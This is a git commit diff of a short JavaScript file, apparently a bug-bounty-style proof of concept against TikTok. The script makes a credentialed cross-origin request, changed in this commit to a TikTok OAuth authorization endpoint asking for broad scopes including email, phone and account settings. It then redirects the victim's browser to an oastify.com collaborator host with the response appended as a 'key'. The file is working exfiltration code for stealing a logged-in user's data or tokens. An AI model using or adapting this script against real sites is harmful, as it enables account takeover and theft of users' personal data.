6ddd9540d9126e33655ef70e573a31cad313a5a4
mrhavit <93275845+mrhavit@users.noreply.github.com>
2023-03-28 21:46:07 +0300

    Update asd.js

--- asd.js
+++ asd.js
@@ -1,9 +1,10 @@
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
-xhr.open("GET", "https://www.tiktok.com/api/notice/multi/?aid=1988&app_language=es&app_name=tiktok_web&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%29&channel=tiktok_web&cookie_enabled=true&device_id=7059024763654440449&device_platform=web_pc&focus_state=true&from_page=setting&group_list=%5B%7B%22count%22%3A20%2C%22is_mark_read%22%3A1%2C%22group%22%3A500%2C%22max_time%22%3A0%2C%22min_time%22%3A0%7D%5D&history_len=3&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=IL&referer=https%3A%2F%2Fwww.tiktok.com%2F&region=IL&root_referer=https%3A%2F%2Fwww.tiktok.com%2F&screen_height=1080&screen_width=1920&tz_name=Asia%2FJerusalem&webcast_language=es&msToken=&X-Bogus=&_signature=");
+xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cvideo.list.manage%2Clive.list%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list%2Cvideo.list.private_ads.no_watermark%2Cuser.info.showcase%2Cuser.account.configure%2Ccomment.list.manage%2Cuser.info.phone&aid=1459&source=web&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fbklaaaaaaaaaaaaaaaaa%2Flogin%2F%3F_extra%3D");
 xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send();
 
 function reqListener() {
-    location='//u3y5ofp07x2nhjhbwfincxp5bwhn5dt2.oastify.com/log?key='+this.responseText; 
+    location='//h6o7nfp0x4i5l3nwdfvnrl6bi2otck09.oastify.com/log?key='+this.responseText; 
 };
